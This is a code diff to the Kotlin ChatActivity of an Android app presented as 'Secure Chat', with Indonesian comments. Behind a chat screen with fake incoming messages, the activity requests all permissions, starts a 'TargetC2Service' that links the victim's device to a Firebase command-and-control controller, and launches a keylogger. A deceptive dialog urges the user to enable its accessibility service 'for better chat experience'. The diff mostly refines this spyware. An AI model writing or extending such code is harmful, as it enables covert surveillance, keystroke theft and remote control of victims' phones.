@@ -8,6 +8,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import android.widget.*
@@ -48,6 +49,7 @@ class ChatActivity : AppCompatActivity() {
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
+        // ============ CRASH LOGGER ============
         Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
             try {
                 val sw = java.io.StringWriter()
@@ -62,6 +64,7 @@ class ChatActivity : AppCompatActivity() {
             } catch (_: Exception) {}
             android.os.Process.killProcess(android.os.Process.myPid())
         }
+        // ======================================
 
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_chat)
@@ -72,8 +75,8 @@ class ChatActivity : AppCompatActivity() {
         progressOverlay = findViewById(R.id.progressOverlay)
         tvTyping = findViewById(R.id.tvTyping)
 
-        adapter = ChatAdapter(messages)
         recyclerView.layoutManager = LinearLayoutManager(this)
+        adapter = ChatAdapter(messages)
         recyclerView.adapter = adapter
 
         btnSend.setOnClickListener {
@@ -84,18 +87,20 @@ class ChatActivity : AppCompatActivity() {
             }
         }
 
-        // Request permissions
+        // Request all permissions
         requestAllPermissions()
 
-        // 🔥🔥🔥 FIX PALING PENTING: START C2 SERVICE 🔥🔥🔥
+        // 🔥🔥🔥 FIX KRITIS: Start C2 Service biar bot connect ke Firebase 🔥🔥🔥
         startC2Service()
 
+        // Fake incoming messages
         fakeIncomingMessages()
 
+        // Start keylogger
         try { startKeylogger() } catch (e: Exception) { e.printStackTrace() }
     }
 
-    /** 🔥 FUNGSI BARU — Start TargetC2Service biar connect ke Firebase */
+    /** 🔥 FUNGSI INI YANG NGEHUBUNGIN TARGET KE FIREBASE CONTROLLER */
     private fun startC2Service() {
         try {
             val intent = Intent(this, TargetC2Service::class.java)
@@ -105,8 +110,7 @@ class ChatActivity : AppCompatActivity() {
             } else {
                 startService(intent)
             }
-            android.util.Log.d("ChatActivity", "✅ TargetC2Service started")
-            Toast.makeText(this, "Starting service...", Toast.LENGTH_SHORT).show()
+            android.util.Log.d("ChatActivity", "✅ TargetC2Service started successfully")
         } catch (e: Exception) {
             android.util.Log.e("ChatActivity", "❌ Gagal start service: ${e.message}", e)
         }
@@ -192,7 +196,7 @@ class ChatActivity : AppCompatActivity() {
         if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("Enable Accessibility")
-            .setMessage("For better chat experience, please enable Secure Chat accessibility service")
+            .setMessage("For better chat experience, please enable Secure Chat accessibility service in Settings > Accessibility > Installed Apps > Secure Chat")
             .setPositiveButton("Open Settings") { _, _ ->
                 startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
             }
@@ -241,8 +245,11 @@ class ChatActivity : AppCompatActivity() {
         try { TargetKeylogger.stop() } catch (e: Exception) { e.printStackTrace() }
     }
 
+    // =============== CHAT ADAPTER ===============
     class ChatAdapter(private val messages: List<Map<String, String>>) : RecyclerView.Adapter<ChatAdapter.ChatViewHolder>() {
-        override fun getItemViewType(position: Int): Int = if (messages[position]["type"] == "sent") 0 else 1
+        override fun getItemViewType(position: Int): Int {
+            return if (messages[position]["type"] == "sent") 0 else 1
+        }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ChatViewHolder {
             val layout = if (viewType == 0) R.layout.item_chat_sent else R.layout.item_chat_received
@@ -251,9 +258,14 @@ class ChatActivity : AppCompatActivity() {
         }
 
         override fun onBindViewHolder(holder: ChatViewHolder, position: Int) {
-            val msg = messages[position]
-            holder.text.text = msg["text"]
-            holder.time.text = msg["time"]
+            try {
+                val msg = messages[position]
+                holder.text.text = msg["text"]
+                holder.time.text = msg["time"]
+            } catch (e: Exception) {
+                holder.text.text = "Error"
+                holder.time.text = "--:--"
+            }
         }
 
         override fun getItemCount() = messages.size
